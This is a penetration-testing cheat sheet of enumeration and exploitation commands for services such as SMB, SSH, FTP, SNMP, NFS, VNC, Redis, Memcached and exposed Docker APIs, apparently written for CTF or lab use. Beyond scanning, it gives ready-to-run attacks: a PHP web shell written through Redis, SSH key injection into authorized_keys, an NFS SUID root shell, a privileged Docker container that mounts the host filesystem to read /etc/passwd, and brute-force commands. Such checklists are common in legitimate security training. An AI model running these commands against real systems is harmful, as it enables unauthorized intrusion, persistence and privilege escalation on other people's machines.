# 🛠️ Common Service-Specific Enumeration

## SMB/NetBIOS (139, 445)

### Basic Enumeration
- [ ] **SMB Protocol Negotiation**:
  ```bash
  nmap --script smb-protocols <target>
  ```
- [ ] **Share Enumeration**:
  ```bash
  smbclient -L //<target> -N
  smbclient -L //<target> -U guest%
  ```
- [ ] **Comprehensive SMB Enum**:
  ```bash
  enum4linux -a <target>
  enum4linux-ng -A <target>
  ```

### Advanced SMB Techniques
- [ ] **SMB Vulnerability Scanning**:
  ```bash
  nmap --script smb-vuln* <target>
  ```
- [ ] **SMB Share Access**:
  ```bash
  smbclient //<target>/<share> -N
  smbmap -H <target>
  smbmap -H <target> -u null -p null
  ```
- [ ] **RPC Enumeration**:
  ```bash
  rpcclient -U "" -N <target>
  # Commands: enumdomusers, enumdomgroups, queryuser <rid>
  ```

---

## SSH (22)
### Basic Enumeration
- [ ] **Banner Grabbing**:
  ```bash
  nc <target> 22
  ssh-keyscan <target>
  ```
- [ ] **SSH Audit**:
  ```bash
  ssh-audit <target>
  ```

### Advanced SSH Testing
- [ ] **Username Enumeration** (CVE-2018-15473):
  ```bash
  python3 ssh_user_enum.py --port 22 --userList users.txt <target>
  ```
- [ ] **Key-based Authentication Testing**:
  ```bash
  ssh -i <private_key> user@<target>
  ```
- [ ] **SSH Tunneling Opportunities**: Note for later lateral movement

---

## FTP/TFTP (21/69)
### Basic FTP Testing
- [ ] **Anonymous Login**:
  ```bash
  ftp <target>
  # anonymous:anonymous or anonymous:email@domain.com
  ```
- [ ] **FTP Banner & Version**:
  ```bash
  nc <target> 21
  nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 <target>
  ```

####Advanced FTP Enumeration
- [ ] **FTP Brute Force** (if needed):
  ```bash
  hydra -L users.txt -P passwords.txt ftp://<target>
  ```
- [ ] **TFTP Testing** (UDP 69):
  ```bash
  tftp <target>
  # Try: get /etc/passwd
  ```

---

## SNMP (161/UDP)
### Basic SNMP Enumeration
- [ ] **Community String Testing**:
  ```bash
  snmpwalk -v2c -c public <target>
  snmpwalk -v2c -c private <target>
  ```
- [ ] **SNMP Brute-force**:
  ```bash
  onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <target>
  ```

### Advanced SNMP Enumeration
- [ ] **System Information**:
  ```bash
  snmpwalk -v2c -c public <target> 1.3.6.1.2.1.1.1.0  # System description
  snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.1.6.0  # Running processes
  ```
- [ ] **User Enumeration**:
  ```bash
  snmpwalk -v2c -c public <target> 1.3.6.1.4.1.77.1.2.25  # Windows users
  ```

---

## NFS (2049)

### Basic NFS Enumeration
- [ ] **Showmount Exports**:
  ```bash
  showmount -e <target>
  ```
- [ ] **Nmap NFS Scripts**:
  ```bash
  nmap -p 2049 --script=nfs-showmount,nfs-ls,nfs-statfs <target>
  ```

### Advanced NFS Enumeration
- [ ] **List NFS Shares with Details**:
  ```bash
  nmap -p 2049 --script=nfs-ls,nfs-statfs,nfs-showmount <target>
  ```
- [ ] **Mount NFS Share**:
  ```bash
  sudo mkdir /mnt/nfs
  sudo mount -t nfs <target>:/<share> /mnt/nfs
  ```
- [ ] **Check for no_root_squash** (Critical for Privilege Escalation):
  - Review `/etc/exports` if accessible
  - Look for `no_root_squash` or `no_all_squash` options
- [ ] **Create SUID Binary for PE** (if no_root_squash):
  ```bash
  # On attacking machine as root
  cp /bin/bash /mnt/nfs/bash
  chmod +s /mnt/nfs/bash
  # On target machine
  ./bash -p
  ```
- [ ] **NFS NULL Session**:
  ```bash
  rpcinfo -p <target>
  ```

---

## VNC (5900+)

### Basic VNC Enumeration
- [ ] **Nmap VNC Scripts**:
  ```bash
  nmap -p 5900-5906 --script vnc-info,vnc-title <target>
  ```
- [ ] **VNC Password Brute Force**:
  ```bash
  nmap -p 5900 --script vnc-brute <target>
  ```

### Advanced VNC Enumeration
- [ ] **Connect with VNC Viewer**:
  ```bash
  vncviewer <target>:5900
  # Or try different displays
  vncviewer <target>::5901
  ```
- [ ] **VNC Authentication Bypass**:
  ```bash
  nmap -p 5900 --script realvnc-auth-bypass <target>
  ```
- [ ] **Check for VNC without Authentication**:
  ```bash
  # Often misconfigured in CTF environments
  ```

---

## Redis (6379)

### Basic Redis Enumeration
- [ ] **Redis-CLI Connect**:
  ```bash
  redis-cli -h <target>
  redis-cli -h <target> -p 6379
  ```
- [ ] **Banner and Info Grab**:
  ```bash
  redis-cli -h <target> info
  echo -e "*1\r\n$4\r\ninfo\r\n" | nc <target> 6379
  ```

### Advanced Redis Enumeration
- [ ] **Nmap Redis Scripts**:
  ```bash
  nmap -p 6379 --script redis-info,redis-brute <target>
  ```
- [ ] **List All Keys**:
  ```bash
  redis-cli -h <target> keys "*"
  ```
- [ ] **Redis RCE via Web Shell** (if web directory writable):
  ```bash
  redis-cli -h <target>
  config set dir /var/www/html
  config set dbfilename shell.php
  set webshell "<?php system($_GET['cmd']); ?>"
  save
  ```
- [ ] **Redis SSH Key Injection**:
  ```bash
  # Generate SSH key pair
  ssh-keygen -t rsa
  # Write public key to Redis
  redis-cli -h <target> flushall
  redis-cli -h <target> set crackit "\n\n$(cat ~/.ssh/id_rsa.pub)\n\n"
  redis-cli -h <target> config set dir /home/user/.ssh
  redis-cli -h <target> config set dbfilename authorized_keys
  redis-cli -h <target> save
  ```

---

## Memcached (11211)

### Basic Memcached Enumeration
- [ ] **Banner Grab and Stats**:
  ```bash
  echo "stats" | nc <target> 11211
  echo "version" | nc <target> 11211
  ```
- [ ] **List All Items**:
  ```bash
  echo "stats items" | nc <target> 11211
  echo "stats cachedump 1 0" | nc <target> 11211
  ```

### Advanced Memcached Enumeration
- [ ] **Nmap Memcached Scripts**:
  ```bash
  nmap -p 11211 --script memcached-info <target>
  ```
- [ ] **Extract Data**:
  ```bash
  # After finding keys from cachedump
  echo "get <keyname>" | nc <target> 11211
  ```
- [ ] **UDP Amplification Check**:
  ```bash
  nmap -sU -p 11211 --script memcached-info <target>
  ```

---

## RPCBind (111)

### Basic RPCBind Enumeration
- [ ] **RPCInfo**:
  ```bash
  rpcinfo -p <target>
  rpcinfo -T tcp <target>
  ```
- [ ] **Nmap RPC Scripts**:
  ```bash
  nmap -sV -p 111 --script=rpcinfo,nfs-showmount <target>
  ```

### Advanced RPCBind Enumeration
- [ ] **Enumerate NFS via RPC**:
  ```bash
  # Look for mountd, nfs, nlockmgr services
  rpcinfo -p <target> | grep nfs
  ```
- [ ] **Check for Other RPC Services**:
  ```bash
  # Look for rusers, rstatd, etc.
  ```

---

## Docker (2375/2376)

### Basic Docker Enumeration
- [ ] **Docker API Version Check**:
  ```bash
  curl http://<target>:2375/version
  curl -s http://<target>:2375/containers/json
  ```
- [ ] **List Images**:
  ```bash
  curl -s http://<target>:2375/images/json
  ```

### Advanced Docker Enumeration
- [ ] **Nmap Docker Scripts**:
  ```bash
  nmap -p 2375,2376 --script docker-version <target>
  ```
- [ ] **Container Escape/RCE**:
  ```bash
  # Create privileged container
  curl -X POST -H "Content-Type: application/json" \
    -d '{"Image":"alpine","Cmd":["sh"],"Privileged":true,"Volumes":{"/:/host":{}}}' \
    http://<target>:2375/containers/create
  ```
- [ ] **Execute Commands in Container**:
  ```bash
  # Get container ID and exec into it
  curl -X POST http://<target>:2375/containers/<id>/start
  curl -X POST -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"Cmd":["cat","/host/etc/passwd"]}' \
    http://<target>:2375/containers/<id>/exec
  ```

---